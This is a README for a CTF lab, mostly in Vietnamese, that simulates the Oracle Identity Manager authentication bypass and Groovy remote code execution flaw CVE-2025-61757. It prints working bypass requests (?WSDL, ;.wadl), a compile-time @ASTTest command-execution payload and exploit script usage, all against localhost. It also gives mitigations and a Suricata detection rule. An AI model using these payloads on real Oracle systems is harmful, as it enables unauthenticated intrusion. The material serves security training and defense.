# CVE-2025-61757: Oracle Identity Manager Pre-Auth RCE Challenge

## Overview

CTF challenge mô phỏng **CVE-2025-61757** - lỗ hổng Pre-Authentication Remote Code Execution nghiêm trọng trong Oracle Identity Manager được phát hiện bởi Searchlight Cyber/AssetNote.

**Thông tin CVE:**
- **CVE ID**: CVE-2025-61757
- **CVSS**: 9.8 (Critical)
- **Affected**: Oracle Identity Manager 12.2.1.4.0, 14.1.2.1.0
- **Type**: Authentication Bypass + Remote Code Execution
- **Discoverers**: Adam Kues & Shubham Shah (Searchlight Cyber)

## Vulnerability Technical Details

### Root Cause

Oracle Identity Manager sử dụng `oracle.wsm.agent.handler.servlet.SecurityFilter` để enforce authentication. Filter này có logic vulnerable:

```java
if (queryString.equalsIgnoreCase("WSDL") 
    || WADL_PATTERN.matcher(requestURI).find()) {
    chain.doFilter(...)  // Bypass authentication
}
```

### Authentication Bypass Methods

#### Method 1: Query Parameter Bypass
```
GET /iam/governance/.../templates?WSDL
```
- Filter check: `queryString.equalsIgnoreCase("WSDL")`
- Bất kỳ endpoint nào + `?WSDL` → bypass auth

#### Method 2: Matrix Parameter Bypass
```
GET /iam/governance/.../templates;.wadl
```
- Java servlet includes matrix parameters trong `getRequestURI()`
- Pattern: `;.wadl` matches regex `WADL_PATTERN`
- Bypass auth thành công

### Remote Code Execution Chain

Sau khi bypass authentication, attacker truy cập:
```
POST /iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus
```

Endpoint này compile Groovy scripts. RCE đạt được thông qua **Groovy @ASTTest annotation**:

```groovy
import groovy.transform.ASTTest
import org.codehaus.groovy.control.CompilePhase

class Exploit {
    @ASTTest(phase = CompilePhase.SEMANTIC_ANALYSIS, value = {
        Runtime.getRuntime().exec("whoami")
    })
    static void main(String[] args) {}
}
```

**Key Point**: Code trong `@ASTTest` annotation executes **during compilation**, không cần runtime execution.

## Setup & Deployment

### Quick Start
```bash
docker-compose up -d
python3 exploit.py http://localhost:14000 --auto
```

### Manual Build
```bash
docker build -t oracle-iam-cve .
docker run -d -p 14000:14000 --name oim-vuln oracle-iam-cve
```

## Exploitation

### Method 1: Automated (Recommended)
```bash
python3 exploit.py http://localhost:14000 --auto
```

### Method 2: Real Groovy Payload
```bash
# Sử dụng @ASTTest annotation như CVE thật
python3 exploit.py http://localhost:14000 --real --cmd "id"
```

### Method 3: Manual Exploitation

**Step 1: Verify vulnerability**
```bash
# Check version
curl http://localhost:14000/identity/rest/v1/info

# Normal request - should fail (401)
curl http://localhost:14000/iam/governance/applicationmanagement/api/v1/applications/templates

# Bypass với ?WSDL - should succeed (200)
curl "http://localhost:14000/iam/governance/applicationmanagement/api/v1/applications/templates?WSDL"
```

**Step 2: Execute commands**
```bash
# Simple payload (CTF mode)
curl -X POST "http://localhost:14000/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL" \
  -H "Content-Type: application/json" \
  -d '{"script": "cat /flag.txt"}'
```

**Step 3: Real Groovy @ASTTest payload**
```bash
curl -X POST "http://localhost:14000/iam/governance/applicationmanagement/api/v1/applications/groovyscriptstatus?WSDL" \
  -H "Content-Type: application/json" \
  -d '{
    "groovyScript": "import groovy.transform.ASTTest\nimport org.codehaus.groovy.control.CompilePhase\n\nclass Exploit {\n    @ASTTest(phase = CompilePhase.SEMANTIC_ANALYSIS, value = {\n        Runtime.getRuntime().exec(\"cat /flag.txt\")\n    })\n    static void main(String[] args) {}\n}"
  }'
```

### Method 4: Interactive Shell
```bash
python3 exploit.py http://localhost:14000 --shell
$ whoami
$ cat /flag.txt
$ exit
```

## Challenge Solution

### Discovery Process

1. **Recon**: Identify Oracle Identity Manager v12.2.1.4.0
2. **Analysis**: Find SecurityFilter implementation
3. **Bypass**: Discover ?WSDL and ;.wadl bypass patterns
4. **RCE**: Locate Groovy compilation endpoint
5. **Exploit**: Use @ASTTest for compile-time execution
6. **Flag**: Retrieve from system

### Exploitation Flow

```
┌─────────────────────────────────────┐
│  1. Target Identification           │
│     GET /identity/rest/v1/info      │
│     → Oracle IAM 12.2.1.4.0         │
└────────────┬────────────────────────┘
             │
┌────────────▼────────────────────────┐
│  2. Authentication Bypass           │
│     GET /endpoint?WSDL              │
│     → 200 OK (bypassed!)            │
└────────────┬────────────────────────┘
             │
┌────────────▼────────────────────────┐
│  3. Groovy RCE                      │
│     POST /groovyscriptstatus?WSDL   │
│     @ASTTest annotation payload     │
│     → Code executes at compile time │
└────────────┬────────────────────────┘
             │
┌────────────▼────────────────────────┐
│  4. System Compromise               │
│     cat /flag.txt                   │
│     → FLAG{...}                     │
└─────────────────────────────────────┘
```

## Key Learning Points

### 1. SecurityFilter Vulnerabilities
- **Problem**: Regex-based allowlists trong Java filters
- **Impact**: Easy authentication bypass
- **Lesson**: Không dùng regex matching cho security checks

### 2. Java Servlet Behavior
- **Matrix Parameters**: `;param=value` included in `getRequestURI()`
- **Query Parameters**: Affect URI matching
- **Lesson**: Hiểu servlet URI processing để find bypasses

### 3. Groovy Compile-Time Execution
- **@ASTTest**: Executes during compilation phase
- **No Runtime Needed**: Bypass runtime restrictions
- **Lesson**: Language features có thể thành attack vectors

### 4. Real-World Impact
- Oracle Cloud breach (6M records, 140K tenants)
- CVE-2021-35587 exploitation
- Critical infrastructure at risk

## Defense & Mitigation

### Immediate Actions
1. ✅ Apply Oracle October 2025 CPU
2. ✅ Restrict `/iam/governance/*` to trusted IPs
3. ✅ Disable unnecessary REST APIs
4. ✅ Monitor logs for bypass patterns

### Secure Code Patterns
```java
// BAD: Regex-based bypass-prone
if (uri.matches(".*\\.wadl$")) {
    return true;
}

// GOOD: Explicit route-based auth
@RequireAuth(role = "ADMIN")
@Path("/admin/endpoint")
public Response endpoint() {}
```

### Detection Rules
```
# Snort/Suricata rule
alert http any any -> any any (
  msg:"CVE-2025-61757 Exploit Attempt";
  flow:established,to_server;
  http.uri; content:"/iam/governance/";
  http.uri; pcre:"/(;\.wadl|\?WSDL)/i";
  classtype:attempted-admin;
  sid:2025061757;
)
```

## References

- **CVE Details**: https://nvd.nist.gov/vuln/detail/CVE-2025-61757
- **CISA KEV**: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- **Oracle CPU**: https://www.oracle.com/security-alerts/cpuoct2025.html
- **Technical Analysis**: Searchlight Cyber Research
- **CVSS Score**: 9.8 (Critical)

## Flag

```
FLAG{CVE_2025_61757_0r4cl3_1d3nt1ty_pwn3d}
```

## Credits

**Challenge Author**: Security Education Team  
**CVE Discoverers**: Adam Kues & Shubham Shah (Searchlight Cyber / AssetNote)  
**Purpose**: Educational CTF challenge demonstrating real-world vulnerability  

## Disclaimer

⚠️ **For Educational Use Only**

This challenge is a simulation for:
- ✅ Security training and education
- ✅ CTF competitions
- ✅ Authorized penetration testing
- ✅ Vulnerability research

**NOT for**:
- ❌ Unauthorized testing
- ❌ Production systems
- ❌ Malicious purposes
- ❌ Real Oracle installations

Unauthorized access to computer systems is illegal.
